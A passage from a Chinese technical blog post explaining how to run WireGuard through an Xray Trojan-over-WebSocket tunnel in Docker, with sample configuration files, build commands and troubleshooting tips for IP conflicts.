class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> 你的自定义的xray本地监听端口，例如<span class="hljs-number">11451</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;trojan&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;clients&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你自己想一个密码&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;streamSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ws&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;wsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/自己设定的路径&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sniffing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;destOverride&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;tls&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;routing&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;rules&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;bittorrent&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blocked&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;outbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;sendThrough&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0.0.0.0&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;freedom&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;redirect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1:WireGuard的本地监听端口&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blocked&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blackhole&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>构建运行，这里直接让容器使用本地网络：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t wg-xray .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --name=wg-xray --network=host wg-xray</span><br></code></pre></td></tr></table></figure><h2 id="内网客户端配置"><a href="#内网客户端配置" class="headerlink" title="内网客户端配置"></a>内网客户端配置</h2><h3 id="1️⃣-配置-WireGuard-1"><a href="#1️⃣-配置-WireGuard-1" class="headerlink" title="1️⃣ 配置 WireGuard"></a>1️⃣ 配置 WireGuard</h3><p>和前面基本一致，其他不再赘叙，不过配置文件修改如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Interface]</span><br><span class="hljs-attr">PrivateKey</span> = 客户端生成的私钥<br><span class="hljs-attr">Address</span> = 上面配置的客户端地址<br><span class="hljs-attr">MTU</span> = <span class="hljs-number">1280</span><br><br><span class="hljs-section">[Peer]</span><br><span class="hljs-attr">PublicKey</span> = 服务端的公钥<br><span class="hljs-attr">Endpoint</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:xray监听的本地端口<br><span class="hljs-attr">AllowedIPs</span> = 服务端网段，例如 <span class="hljs-number">10.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><h3 id="2️⃣-配置-xray"><a href="#2️⃣-配置-xray" class="headerlink" title="2️⃣ 配置 xray"></a>2️⃣ 配置 xray</h3><p>直接上 Docker：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> debian:latest<br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get upgrade -y</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y curl wget unzip procps</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> wget -P /root/ https://github.com/XTLS/Xray-core/releases/download/v24.11.5/Xray-linux-64.zip</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> unzip /root/Xray-linux-64.zip -d /root/</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/xray</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./config.json /root/config.json</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\n/root/xray run -config /root/config.json\nsleep infinity&quot;</span> &gt; /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> -p /var/log/xray</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">ln</span> -sf ../usr/share/zoneinfo/Australia/Melbourne /etc/localtime</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/start.sh&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>配置文件 <code>config.json</code> 这么写：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;log&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;access&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;loglevel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;warning&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;inbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;wireguard&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> 本地代理端口例如<span class="hljs-number">11451</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;dokodemo-door&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> 本地代理端口例如<span class="hljs-number">11451</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;udp&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;followRedirect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;outbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;proxy&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;trojan&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;servers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的域名&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;method&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;chacha20&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;ota&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的密码&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">443</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;streamSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ws&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;security&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;tls&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;tlsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;allowInsecure&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;serverName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的域名&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;fingerprint&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;chrome&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;wsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/你的子路径&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;headers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;Host&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的域名&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;mux&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;concurrency&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">-1</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;direct&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;freedom&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;block&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blackhole&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;response&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;dns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;hosts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;dns.google&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;8.8.8.8&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;proxy.example.com&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;servers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;223.5.5.5&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;domains&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;你的域名&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;223.5.5.5&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;domains&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;geosite:cn&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;geosite:geolocation-cn&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;expectIPs&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;geoip:cn&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;1.1.1.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;8.8.8.8&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;https://dns.google/dns-query&quot;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;routing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;domainStrategy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AsIs&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;rules&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;inboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;api&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;api&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;443&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;udp&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;block&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0-65535&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;proxy&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>构建运行，这里直接让容器使用本地网络：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t wg-xray .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --name=wg-xray --network=host wg-xray</span><br></code></pre></td></tr></table></figure><p>成功连接，唯一的问题是延迟可能会相对比较高：</p><p><img src="https://s2.loli.net/2024/11/08/Ne5SUfJXy1DGTMi.png"></p><h1 id="0x04-可能遇到的问题"><a href="#0x04-可能遇到的问题" class="headerlink" title="0x04. 可能遇到的问题"></a>0x04. 可能遇到的问题</h1><h2 id="客户端能握手但无法连接其他终端，wg-show-显示-allowed-ips-none"><a href="#客户端能握手但无法连接其他终端，wg-show-显示-allowed-ips-none" class="headerlink" title="客户端能握手但无法连接其他终端，wg show 显示 allowed ips: (none)"></a>客户端能握手但无法连接其他终端，wg show 显示 <code>allowed ips: (none)</code></h2><p>在多设备连接到同一网络时可能出现，客户端无法连接到包括服务端在内的其他终端， <em>但是可能会有一个奇异现象是仅有一个客户端能正常连接</em> ：</p><p><img src="https://s2.loli.net/2024/10/21/4povIUfe3JaiyMb.png"></p><p>出现这种情况的原因可能是因为 <strong>IP 冲突</strong> ，大概原因是客户端之间的 IP 相互 overlap 了，从而只有其中一个能够正常工作</p><p>最简单的解决方案是 <strong>把客户端的子网掩码 设为 &#x2F;32</strong> ，下面是一个示例配置文件：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Interface]</span><br><span class="hljs-attr">PrivateKey</span> = 客户端私钥<br><span class="hljs-attr">Address</span> = <span class="hljs-number">10.191</span>.<span class="hljs-number">98.10</span>/<span class="hljs-number">32</span><br><span class="hljs-attr">MTU</span> = <span class="hljs-number">1280</span><br><br><span class="hljs-section">[Peer]</span><br><span class="hljs-attr">PublicKey</span> = 服务端公钥<br><span class="hljs-attr">Endpoint</span> = 服务端公网IP或域名:服务端配置的端口<br><span class="hljs-attr">AllowedIPs</span> = <span class="hljs-number">10.191</span>.<span class="hljs-number">98.0</span>/<span class="hljs-number">24</span><br><span class="hljs-attr">PersistentKeepalive</span> = <span class="hljs-number">25</span><br></code></pre></td></tr></table></figure><p>对应的服务端配置：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Interface]</span><br><span class="hljs-attr">Address</span> = <span class="hljs-number">10.191</span>.<span class="hljs-number">98.1</span>/<span class="hljs-number">24</span><br><span class="hljs-attr">PostUp</span>   = iptables -A FORWARD -i wg0 -j ACCEPT<span class="hljs-comment">; iptables -A FORWARD -o wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="hljs-attr">PostDown</span> = iptables -D FORWARD -i wg0 -j ACCEPT<span class="hljs-comment">; iptables -D FORWARD -o wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="hljs-attr">ListenPort</span> = 服务端配置的端口<br><span class="hljs-attr">PrivateKey</span> = 服务端私钥<br><br><span class="hljs-section">[Peer]</span><br><span class="hljs-attr">PublicKey</span> = 客户端公钥<br><span class="hljs-attr">AllowedIPs</span> = <span class="hljs-number">10.191</span>.<span class="hljs-number">98.10</span>/<span class="hljs-number">32</span><br></code></pre></td></tr></table></figure><h2 id="配置-WireGuard-后无法解析域名，但可以通过-IP-进行访问"><a href="#配置-WireGuard-后无法解析域名，但可以通过-IP-进行访问" class="headerlink" title="配置 WireGuard 后无法解析域名，但可以通过 IP 进行访问"></a>配置 WireGuard 后无法解析域名，但可以通过 IP 进行访问</h2><p>可能是 DNS 解析出现问题，在客户端配置文件当中你可能会习惯性额外配置如下：</p><figure class="highlight ini"><table><tr><td 